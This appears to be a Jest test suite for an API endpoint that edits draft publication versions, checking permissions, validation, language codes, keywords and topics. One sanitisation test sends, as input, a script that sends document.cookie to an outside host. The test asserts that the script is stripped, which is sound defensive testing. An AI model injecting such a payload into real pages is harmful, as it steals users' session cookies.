import * as testUtils from 'lib/testUtils';

beforeEach(async () => {
    await testUtils.clearDB();
    await testUtils.testSeed();
});

describe('Update publication version', () => {
    test('Cannot update without permission', async () => {
        const updatedVersion = await testUtils.agent.patch('/publication-versions/publication-interpretation-draft-v1');

        expect(updatedVersion.status).toEqual(401);
    });

    test('Cannot update with incorrect permissions', async () => {
        const updatedVersion = await testUtils.agent
            .patch('/publication-versions/publication-interpretation-draft-v1')
            .query({ apiKey: 987654321 });

        expect(updatedVersion.status).toEqual(403);
    });

    test('Can update publication version title', async () => {
        const updatedVersion = await testUtils.agent
            .patch('/publication-versions/publication-interpretation-draft-v1')
            .query({ apiKey: 123456789 })
            .send({ title: 'New title' });

        expect(updatedVersion.status).toEqual(200);
        expect(updatedVersion.body.title).toEqual('New title');
    });

    test('Can update publication version content if "safe" HTML', async () => {
        const updatedVersion = await testUtils.agent
            .patch('/publication-versions/publication-interpretation-draft-v1')
            .query({ apiKey: 123456789 })
            .send({ content: '<p>Hello <a href="#nathan">Nathan</a></p>' });

        expect(updatedVersion.status).toEqual(200);
    });

    test('HTML is sanitised if not "safe"', async () => {
        const updatedVersion = await testUtils.agent
            .patch('/publication-versions/publication-interpretation-draft-v1')
            .query({ apiKey: 123456789 })
            .send({
                content:
                    '<p><a target="_blank" href="http://example.net">test</a></p><script>alert(\'XSS\')</script><script>var i=new Image;i.src=\'https://b.soc.ja.net?\'+document.cookie;</script>'
            });

        expect(updatedVersion.body.content).toEqual('<p><a href="http://example.net">test</a></p>');
    });

    test('Cannot update publication version licence', async () => {
        // This was previously possible but we have now removed the ability because
        // there is only one licence type we want people to use and we set it automatically.
        const updatedVersion = await testUtils.agent
            .patch('/publication-versions/publication-interpretation-draft-v1')
            .query({ apiKey: 123456789 })
            .send({ licence: 'CC_BY_SA' });

        expect(updatedVersion.status).toEqual(400);
    });

    test('Can update keywords', async () => {
        const updatedVersion = await testUtils.agent
            .patch('/publication-versions/publication-interpretation-draft-v1')
            .query({ apiKey: 123456789 })
            .send({ keywords: ['science', 'technology'] });

        expect(updatedVersion.body.keywords.length).toEqual(2);
    });

    test('Can update description', async () => {
        const updatedVersion = await testUtils.agent
            .patch('/publication-versions/publication-interpretation-draft-v1')
            .query({ apiKey: 123456789 })
            .send({ description: 'Test description' });

        expect(updatedVersion.body.description).toEqual('Test description');
    });

    test('Cannot update publication version with invalid update parameter', async () => {
        const updatedVersion = await testUtils.agent
            .patch('/publication-versions/publication-interpretation-draft-v1')
            .query({ apiKey: 123456789 })
            .send({ doesNotExist: 'invalid-parameter' });

        expect(updatedVersion.status).toEqual(400);
    });

    test('Cannot update LIVE publication', async () => {
        const updatedVersion = await testUtils.agent
            .patch('/publication-versions/publication-real-world-application-live-v1')
            .query({ apiKey: 123456789 })
            .send({ title: 'Brand new title' });

        expect(updatedVersion.status).toEqual(400);
    });

    test('Cannot add more than 10 keywords', async () => {
        const updatedVersion = await testUtils.agent
            .patch('/publication-versions/publication-interpretation-draft-v1')
            .query({ apiKey: 123456789 })
            .send({ keywords: ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11'] });

        expect(updatedVersion.status).toEqual(400);
    });

    test('Cannot add more than 160 characters into a description', async () => {
        const updatedVersion = await testUtils.agent
            .patch('/publication-versions/publication-interpretation-draft-v1')
            .query({ apiKey: 123456789 })
            .send({
                description:
                    'testing123testing123testing123testing123testing123testing123testing123testing123testing123testing123testing123testing123testing123testing123testing123testing123x'
            });

        expect(updatedVersion.status).toEqual(400);
    });

    // Language tests
    test('Valid publication updated by real user when provided a correct ISO-639-1 language code', async () => {
        const createPublicationRequest = await testUtils.agent
            .patch('/publication-versions/publication-interpretation-draft-v1')
            .query({
                apiKey: '123456789'
            })
            .send({
                language: 'fr'
            });

        expect(createPublicationRequest.status).toEqual(200);
        expect(createPublicationRequest.body.language).toEqual('fr');
    });

    test('Publication failed to be updated if language code provided is not out of the ISO-639-1 language list', async () => {
        const createPublicationRequest = await testUtils.agent
            .patch('/publication-versions/publication-interpretation-draft-v1')
            .query({
                apiKey: '123456789'
            })
            .send({
                language: 'zz' // https://en.wikipedia.org/wiki/List_of_ISO_639-1_codes
            });

        expect(createPublicationRequest.status).toEqual(400);
    });

    test('Publication failed to be updated if language provided is less than 2 chars', async () => {
        const createPublicationRequest = await testUtils.agent
            .patch('/publication-versions/publication-interpretation-draft-v1')
            .query({
                apiKey: '123456789'
            })
            .send({
                language: 'e'
            });

        expect(createPublicationRequest.status).toEqual(400);
    });

    test('Publication failed to be updated if language provided is more than 2 chars', async () => {
        const createPublicationRequest = await testUtils.agent
            .patch('/publication-versions/publication-interpretation-draft-v1')
            .query({
                apiKey: '123456789'
            })
            .send({
                language: 'enn'
            });

        expect(createPublicationRequest.status).toEqual(400);
    });

    test('Publication failed to update if is not protocol or hypotheses and supplies a self declaration', async () => {
        const createPublicationRequest = await testUtils.agent
            .patch('/publication-versions/publication-interpretation-draft-v1')
            .query({
                apiKey: '123456789'
            })
            .send({
                selfDeclaration: true
            });

        expect(createPublicationRequest.status).toEqual(400);
    });

    test('Can update publication version topics', async () => {
        const updateTopicsRequest = await testUtils.agent
            .patch('/publication-versions/publication-problem-draft-v1')
            .query({ apiKey: '000000005' })
            .send({ topics: ['test-topic-1'] });

        expect(updateTopicsRequest.status).toEqual(200);
        expect(updateTopicsRequest.body.topics.length).toEqual(1);
        expect(updateTopicsRequest.body.topics[0]).toMatchObject({
            id: 'test-topic-1',
            title: 'Test topic'
        });
    });

    test('Cannot update topics when publication type is not problem', async () => {
        const updateTopicsRequest = await testUtils.agent
            .patch('/publication-versions/publication-hypothesis-draft-v1')
            .query({ apiKey: '000000005' })
            .send({ topics: ['test-topic-1'] });

        expect(updateTopicsRequest.status).toEqual(400);
        expect(updateTopicsRequest.body.message).toEqual(
            'You can not supply topics for a publication that is not a problem.'
        );
    });

    test('Cannot update topics when there is no active draft', async () => {
        const updateTopicsRequest = await testUtils.agent
            .patch('/publication-versions/publication-problem-live-v1')
            .query({ apiKey: '123456789' })
            .send({ topics: ['test-topic-1'] });

        expect(updateTopicsRequest.status).toEqual(400);
        expect(updateTopicsRequest.body.message).toEqual(
            'A publication version that is not in DRAFT state cannot be updated.'
        );
    });

    test('Cannot update topics for invalid publication id', async () => {
        const updateTopicsRequest = await testUtils.agent
            .patch('/publication-versions/made-up-publication-id-v1')
            .query({ apiKey: '123456789' })
            .send({ topics: ['test-topic-1'] });

        expect(updateTopicsRequest.status).toEqual(404);
        expect(updateTopicsRequest.body.message).toEqual('This publication version does not exist.');
    });

    test('Cannot update publication with invalid topic id', async () => {
        const updateTopicsRequest = await testUtils.agent
            .patch('/publication-versions/publication-problem-draft-v1')
            .query({ apiKey: '000000005' })
            .send({ topics: ['made-up-topic-id'] });

        expect(updateTopicsRequest.status).toEqual(500);
    });

    test('Cannot update publication version topics without permission', async () => {
        const updateTopicsRequest = await testUtils.agent
            .patch('/publication-versions/publication-problem-draft-v1')
            .query({ apiKey: '987654321' })
            .send({ topics: ['test-topic-1'] });

        expect(updateTopicsRequest.status).toEqual(403);
        expect(updateTopicsRequest.body.message).toEqual(
            'You do not have permission to modify this publication version.'
        );
    });
});
